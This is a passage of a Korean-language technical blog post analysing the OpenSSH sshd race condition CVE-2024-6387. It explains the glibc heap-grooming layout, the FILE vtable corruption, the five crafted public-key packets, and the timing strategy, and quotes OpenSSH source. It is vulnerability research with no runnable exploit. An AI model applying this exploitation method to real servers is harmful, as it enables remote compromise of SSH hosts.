  <li><code class="language-plaintext highlighter-rouge">Large hole</code>(8KB 크기의 free된 청크)와 <code class="language-plaintext highlighter-rouge">small hole</code>(<code class="language-plaintext highlighter-rouge">320B</code> 크기의 <code class="language-plaintext highlighter-rouge">free</code>된 청크)가 존재합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">4KB</code> 크기의 청크를 요청하여 <code class="language-plaintext highlighter-rouge">Large hole</code>을 두 개의 청크로 나누도록 유도합니다.
    <ul>
      <li>이때 해당 작업에 의해 <code class="language-plaintext highlighter-rouge">Large hole</code>이 두 개의 청크로 나뉘어진 뒤 위의 <code class="language-plaintext highlighter-rouge">4339</code>행이 실행되기전에 <code class="language-plaintext highlighter-rouge">SIGALRM</code>에 의해서 <code class="language-plaintext highlighter-rouge">malloc</code>의 처리가 중단됩니다.</li>
      <li>이렇게 처리가 중단된 <code class="language-plaintext highlighter-rouge">free remainder</code> 청크의 크기는 이전 값에 의해서 결정됩니다.</li>
      <li><code class="language-plaintext highlighter-rouge">remainder</code>의 크기가 갱신되지 않고 이전 값(찌거기 값)에 의해서 크기가 증가했기 때문에 청크는 뒤의 <code class="language-plaintext highlighter-rouge">small hole</code>까지 겹치게됩니다.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">SIGARLM</code>의 <code class="language-plaintext highlighter-rouge">syslog</code>에서 앞서 알아본 흐름에 의해 <code class="language-plaintext highlighter-rouge">fopen</code>을 호출해 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체가 <code class="language-plaintext highlighter-rouge">small hole</code>에 할당됩니다.
    <ul>
      <li>이는 앞선 처리에 의해 <code class="language-plaintext highlighter-rouge">remainder</code> 청크와 겹치는 영역이 됩니다.</li>
    </ul>
  </li>
  <li>인위적으로 증가한 <code class="language-plaintext highlighter-rouge">remainder</code> 청크는 <code class="language-plaintext highlighter-rouge">fopen</code> 이후의 <code class="language-plaintext highlighter-rouge">__fread_unlocked</code>에서 <code class="language-plaintext highlighter-rouge">4KB read buffer</code>를 할당받는 과정에서 한번 더 쪼개지게됩니다.</li>
  <li>remainder 청크가 기록되고 FILE의 <code class="language-plaintext highlighter-rouge">_vtable_offset</code> 멤버가 remainder 청크의 bk 필드의 3번째 바이트로 덮어씌워지게됩니다.(0x61)
    <ul>
      <li>이때 <code class="language-plaintext highlighter-rouge">FILE</code> 구조체의 <code class="language-plaintext highlighter-rouge">_codevt</code> 멤버는 <code class="language-plaintext highlighter-rouge">glibc</code>의 <code class="language-plaintext highlighter-rouge">malloc</code> 빈 중 하나를 가리키게 덮어씌워집니다.</li>
      <li>이때의 가정은 해당 주소를 모두 공격자가 안다고 가정합니다.</li>
    </ul>
  </li>
</ul>

<p>위의 설명만 봐도 엄청나게 까다로운 조건이 있다는 것을 알 수 있습니다. 이런 까다로운 조건들을 다시 정리해보면 다음과 같습니다.</p>

<ul>
  <li>공격을 성공시키기 위해선 <code class="language-plaintext highlighter-rouge">glibc</code> <code class="language-plaintext highlighter-rouge">FILE</code> 구조체의 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>이 활성화 되어있어야 하기 때문에 현재 정리된 글에선 i386 glibc만 가능합니다.</li>
  <li>또한 i386 sshd의 메모리가 <code class="language-plaintext highlighter-rouge">0xb7200000</code> 또는 <code class="language-plaintext highlighter-rouge">0xb7400000</code>에만 매핑된다는 점을 악용합니다.
    <ul>
      <li>이를 이용해 <code class="language-plaintext highlighter-rouge">ASLR</code>을 최대한 우회하고 이미 알고 있는 주소를 활용합니다.</li>
    </ul>
  </li>
  <li>앞선 언급과 같이 이미 주소값들을 알고 있다는 가정으로 시작을 하기 때문에 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>을 덮어쓸 때 쓰는 <code class="language-plaintext highlighter-rouge">bk</code>값 역시 <code class="language-plaintext highlighter-rouge">0xb761d7f8</code>로 고정입니다.
    <ul>
      <li>해당 값의 3번째 바이트 값이 <code class="language-plaintext highlighter-rouge">0x61</code>이므로 <code class="language-plaintext highlighter-rouge">_vtable_offset</code>이 <code class="language-plaintext highlighter-rouge">0x61</code>로 오염된다고 가정할 수 있습니다.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">FILE</code>을 덮어쓰기 위해 정확한 타이밍에 위 레이아웃을 달성한 상태로 <code class="language-plaintext highlighter-rouge">malloc</code>의 수행 중에 <code class="language-plaintext highlighter-rouge">SIGALRM</code>이 발생해야합니다.</li>
</ul>

<p>위와 같은 시나리오를 성공적으로 달성하기 위해 실험에서는 다음과 같은 레이아웃을 구상하여 레이스 컨디션에서 목적을 달성하려합니다.</p>

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/heap_layout.png" /></p>

<p>힙 레이아웃을 어떻게 이렇게 만들까요? 다음 함수들을 이용합니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1754</span> <span class="nf">cert_parse</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshkey</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">certbuf</span><span class="p">)</span>
<span class="mi">1755</span> <span class="p">{</span>
<span class="p">....</span>
<span class="mi">1797</span>         <span class="k">while</span> <span class="p">(</span><span class="n">sshbuf_len</span><span class="p">(</span><span class="n">principals</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="p">....</span>
<span class="mi">1805</span>                 <span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">=</span> <span class="n">sshbuf_get_cstring</span><span class="p">(</span><span class="n">principals</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">principal</span><span class="p">,</span>
<span class="p">....</span>
<span class="mi">1820</span>                 <span class="n">key</span><span class="o">-&gt;</span><span class="n">cert</span><span class="o">-&gt;</span><span class="n">principals</span><span class="p">[</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">cert</span><span class="o">-&gt;</span><span class="n">nprincipals</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">principal</span><span class="p">;</span>
<span class="mi">1821</span>         <span class="p">}</span>
<span class="o">------------------------------------------------------------------------</span>
 <span class="mi">562</span> <span class="n">cert_free</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshkey_cert</span> <span class="o">*</span><span class="n">cert</span><span class="p">)</span>
 <span class="mi">563</span> <span class="p">{</span>
 <span class="p">...</span>
 <span class="mi">572</span>         <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cert</span><span class="o">-&gt;</span><span class="n">nprincipals</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
 <span class="mi">573</span>                 <span class="n">free</span><span class="p">(</span><span class="n">cert</span><span class="o">-&gt;</span><span class="n">principals</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</code></pre></div></div>

<p>함수 명에서도 볼 수 있듯 공개 키 파싱 코드를 악용해서 위의 힙 레이아웃을 만들게됩니다. 이때 <code class="language-plaintext highlighter-rouge">cert_parse</code>의 <code class="language-plaintext highlighter-rouge">1805</code>행에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_9_2/sshkey.c#L1805"><code class="language-plaintext highlighter-rouge">sshbuf_get_cstring</code></a>과 <code class="language-plaintext highlighter-rouge">cert_free</code>의 <code class="language-plaintext highlighter-rouge">573</code>행에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_9_2/sshkey.c#L573C3-L573C7"><code class="language-plaintext highlighter-rouge">free</code></a>를 이용합니다.</p>

<p><code class="language-plaintext highlighter-rouge">sshbuf_get_cstring</code>은 다음과 같이 <code class="language-plaintext highlighter-rouge">malloc</code>을 사용합니다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">sshbuf_get_cstring</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">valp</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">lenp</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
	<span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">z</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">r</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">valp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">valp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">lenp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">lenp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">=</span> <span class="n">sshbuf_peek_string_direct</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">p</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">r</span><span class="p">;</span>
	<span class="cm">/* Allow a \0 only at the end of the string */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span>
	    <span class="p">(</span><span class="n">z</span> <span class="o">=</span> <span class="n">memchr</span><span class="p">(</span><span class="n">p</span> <span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="n">len</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">z</span> <span class="o">&lt;</span> <span class="n">p</span> <span class="o">+</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">SSHBUF_DBG</span><span class="p">((</span><span class="s">"SSH_ERR_INVALID_FORMAT"</span><span class="p">));</span>
		<span class="k">return</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">=</span> <span class="n">sshbuf_skip_string</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">valp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">valp</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">SSHBUF_DBG</span><span class="p">((</span><span class="s">"SSH_ERR_ALLOC_FAIL"</span><span class="p">));</span>
			<span class="k">return</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
			<span class="n">memcpy</span><span class="p">(</span><span class="o">*</span><span class="n">valp</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
		<span class="p">(</span><span class="o">*</span><span class="n">valp</span><span class="p">)[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">lenp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">lenp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">len</span><span class="p">;</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위에서 알아본 힙 레이아웃을 달성하기 위해서 <code class="language-plaintext highlighter-rouge">sshd</code>에 다음과 같은 5개의 서로 다른 공개 키 패킷을 전송합니다.</p>

<ul>
  <li>a : <code class="language-plaintext highlighter-rouge">tcache</code> 크기의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하기 위한 패킷</li>
  <li>b : 다양한 크기(<code class="language-plaintext highlighter-rouge">~8KB</code>, <code class="language-plaintext highlighter-rouge">320B hole</code>)의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하여 27개의 <code class="language-plaintext highlighter-rouge">large hole</code>, <code class="language-plaintext highlighter-rouge">small hole</code> 쌍을 만들기 위한 패킷</li>
  <li>c : 이미 <code class="language-plaintext highlighter-rouge">free</code>된 청크들이 익스플로잇에서 조작된 값을 사용할 수 있게 미리 값들을 세팅해두는 패킷
    <ul>
      <li><code class="language-plaintext highlighter-rouge">remainder</code>의 크기를 크게 만들 가짜 헤더를 중간에 기록</li>
      <li><code class="language-plaintext highlighter-rouge">glibc</code>의 보안 검사를 통과하기 위한 <code class="language-plaintext highlighter-rouge">footer</code>를 <code class="language-plaintext highlighter-rouge">small hole</code> 끝 부분에 기록</li>
      <li><code class="language-plaintext highlighter-rouge">fake vtable</code>과 <code class="language-plaintext highlighter-rouge">_codecvt</code> 포인터를 <code class="language-plaintext highlighter-rouge">small hole</code>에 기록</li>
    </ul>
  </li>
  <li>d : 앞서<code class="language-plaintext highlighter-rouge"> free</code>한 청크들이 <code class="language-plaintext highlighter-rouge">unsorted bin</code>에서 각각의 <code class="language-plaintext highlighter-rouge">large bin</code>과 <code class="language-plaintext highlighter-rouge">small bin</code>에 배치될 수 있도록 하는 패킷</li>
  <li>e : 27개의 쌍을 이용해 레이스 컨디션을 수행하기 위한 패킷(앞서 알아본 힙 레이아웃 조작을 위한 시퀀스 수행 : <code class="language-plaintext highlighter-rouge">malloc(~4KB)</code>, <code class="language-plaintext highlighter-rouge">malloc(304)</code>, <code class="language-plaintext highlighter-rouge">malloc(~4KB), malloc(304))</code></li>
</ul>

<h4 id="timing-strategy">Timing strategy</h4>

<p>여러 제약 사항 때문에 결과적으로 다음과 같은 함수에서 시간을 측정하여 패킷 전송 타이밍을 맞추게됩니다.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">88</span> <span class="nf">userauth_pubkey</span><span class="p">(</span><span class="k">struct</span> <span class="n">ssh</span> <span class="o">*</span><span class="n">ssh</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">method</span><span class="p">)</span>
 <span class="mi">89</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">138</span>         <span class="k">if</span> <span class="p">(</span><span class="n">pktype</span> <span class="o">==</span> <span class="n">KEY_UNSPEC</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">139</span>                 <span class="cm">/* this is perfectly legal */</span>
<span class="mi">140</span>                 <span class="n">verbose_f</span><span class="p">(</span><span class="s">"unsupported public key algorithm: %s"</span><span class="p">,</span> <span class="n">pkalg</span><span class="p">);</span>
<span class="mi">141</span>                 <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="mi">142</span>         <span class="p">}</span>
<span class="mi">143</span>         <span class="nf">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">=</span> <span class="n">sshkey_from_blob</span><span class="p">(</span><span class="n">pkblob</span><span class="p">,</span> <span class="n">blen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">144</span>                 <span class="n">error_fr</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s">"parse key"</span><span class="p">);</span>
<span class="mi">145</span>                 <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="mi">146</span>         <span class="p">}</span>
<span class="p">...</span>
<span class="mi">151</span>         <span class="nf">if</span> <span class="p">(</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">!=</span> <span class="n">pktype</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">152</span>                 <span class="n">error_f</span><span class="p">(</span><span class="s">"type mismatch for decoded key "</span>
<span class="mi">153</span>                     <span class="s">"(received %d, expected %d)"</span><span class="p">,</span> <span class="n">key</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">,</span> <span class="n">pktype</span><span class="p">);</span>
<span class="mi">154</span>                 <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="mi">155</span>         <span class="p">}</span>
</code></pre></div></div>
<ul>
  <li>공개 키 패킷 중 <code class="language-plaintext highlighter-rouge">pktype</code>에 오류가 발생하게끔 데이터를 설정해 138~142행에서 패킷 오류가 발생하게 합니다.</li>
  <li>두 번째로 공개 키 패킷 중 <code class="language-plaintext highlighter-rouge">key-&gt;type</code>에 오류가 발생하게끔 데이터를 설정해 151~155행에서 패킷 오류가 발생하게 합니다.</li>
  <li>이때 143행에 존재하는 <code class="language-plaintext highlighter-rouge">sshkey_from_blob</code>은 공개키를 파싱하는 함수로 위에서 알아본 양옆에있는 두 함수의 응답 시간의 차가 <code class="language-plaintext highlighter-rouge">sshd</code>가 공개 키를 파싱하는 데 걸리는 시간이 됩니다.</li>
  <li>이를 통해 마지막 패킷의 전송시간을 조절합니다.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">sshkey_from_blob</code>은 다음과 같은 흐름으로 <code class="language-plaintext highlighter-rouge">cert_parse</code>를 호출합니다.</p>

<details>
<summary>sshkey.c:sshkey_from_blob</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">sshkey_from_blob</span><span class="p">(</span><span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">blob</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">blen</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshkey</span> <span class="o">**</span><span class="n">keyp</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">r</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">((</span><span class="n">b</span> <span class="o">=</span> <span class="n">sshbuf_from</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span> <span class="n">blen</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">sshkey_from_blob_internal</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">keyp</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="n">sshbuf_free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>sshkey.c:sshkey_from_blob_internal</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span>
<span class="nf">sshkey_from_blob_internal</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshkey</span> <span class="o">**</span><span class="n">keyp</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">allow_cert</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INTERNAL_ERROR</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">ktype</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sshkey</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">copy</span><span class="p">;</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">sshkey_impl</span> <span class="o">*</span><span class="n">impl</span><span class="p">;</span>

<span class="cp">#ifdef DEBUG_PK </span><span class="cm">/* XXX */</span><span class="cp">
</span>	<span class="n">sshbuf_dump</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
<span class="cp">#endif
</span>	<span class="k">if</span> <span class="p">(</span><span class="n">keyp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">keyp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">copy</span> <span class="o">=</span> <span class="n">sshbuf_fromb</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sshbuf_get_cstring</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ktype</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">type</span> <span class="o">=</span> <span class="n">sshkey_type_from_name</span><span class="p">(</span><span class="n">ktype</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allow_cert</span> <span class="o">&amp;&amp;</span> <span class="n">sshkey_type_is_cert</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_KEY_CERT_INVALID_SIGN_KEY</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">impl</span> <span class="o">=</span> <span class="n">sshkey_impl_from_type</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_KEY_TYPE_UNKNOWN</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">key</span> <span class="o">=</span> <span class="n">sshkey_new</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sshkey_type_is_cert</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="p">{</span>
		<span class="cm">/* Skip nonce that preceeds all certificates */</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">sshbuf_get_string_direct</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
			<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">=</span> <span class="n">impl</span><span class="o">-&gt;</span><span class="n">funcs</span><span class="o">-&gt;</span><span class="n">deserialize_public</span><span class="p">(</span><span class="n">ktype</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

	<span class="cm">/* Parse certificate potion */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sshkey_is_cert</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">ret</span> <span class="o">=</span> <span class="n">cert_parse</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">copy</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">sshbuf_len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">keyp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="o">*</span><span class="n">keyp</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
		<span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">}</span>
 <span class="nl">out:</span>
	<span class="n">sshbuf_free</span><span class="p">(</span><span class="n">copy</span><span class="p">);</span>
	<span class="n">sshkey_free</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
	<span class="n">free</span><span class="p">(</span><span class="n">ktype</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>    </div>
  </div>
</details>

<p>사실상 위에서 알아본 제약 사항 때문에 해당 취약점을 이용하는 것은 많이 힘들어보입니다. 또한 환경에 대한 제약 역시 큽니다. 이제 PoC를 확인해봅시다.</p>

<h1 id="poc-analysis">PoC Analysis</h1>

<p><a href="https://github.com/lflare/cve-2024-6387-poc/tree/master">PoC</a>가 현재 공개된 상태지만 의도적으로 해당 PoC는 작동하지않게 작성되어있습니다.</p>

<p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/commit_history.png" /></p>
<p><br /></p>

<p>PoC는 앞서 알아본 다음과 같은 순서로 패킷을 전송합니다.</p>

<ul>
  <li>a : <code class="language-plaintext highlighter-rouge">tcache</code> 크기의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하기 위한 패킷</li>
  <li>b : 다양한 크기(<code class="language-plaintext highlighter-rouge">~8KB</code>, <code class="language-plaintext highlighter-rouge">320B hole</code>)의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하여 27개의 <code class="language-plaintext highlighter-rouge">large hole</code>, <code class="language-plaintext highlighter-rouge">small hole</code> 쌍을 만들기 위한 패킷</li>
  <li>c : 이미 <code class="language-plaintext highlighter-rouge">free</code>된 청크들이 익스플로잇에서 조작된 값을 사용할 수 있게 미리 값들을 세팅해두는 패킷
    <ul>
      <li><code class="language-plaintext highlighter-rouge">remainder</code>의 크기를 크게 만들 가짜 헤더를 중간에 기록</li>
      <li><code class="language-plaintext highlighter-rouge">glibc</code>의 보안 검사를 통과하기 위한 <code class="language-plaintext highlighter-rouge">footer</code>를 <code class="language-plaintext highlighter-rouge">small hole</code> 끝 부분에 기록</li>
      <li><code class="language-plaintext highlighter-rouge">fake vtable</code>과 <code class="language-plaintext highlighter-rouge">_codecvt</code> 포인터를 <code class="language-plaintext highlighter-rouge">small hole</code>에 기록</li>
    </ul>
  </li>
  <li>d : 앞서 <code class="language-plaintext highlighter-rouge">free</code>한 청크들이 <code class="language-plaintext highlighter-rouge">unsorted bin</code>에서 각각의 <code class="language-plaintext highlighter-rouge">large bin</code>과 <code class="language-plaintext highlighter-rouge">small bin</code>에 배치될 수 있도록 하는 패킷</li>
  <li>e : 27개의 쌍을 이용해 레이스 컨디션을 수행하기 위한 패킷(앞서 알아본 힙 레이아웃 조작을 위한 시퀀스 수행 : <code class="language-plaintext highlighter-rouge">malloc(~4KB)</code>, <code class="language-plaintext highlighter-rouge">malloc(304)</code>, <code class="language-plaintext highlighter-rouge">malloc(~4KB), malloc(304))</code></li>
</ul>

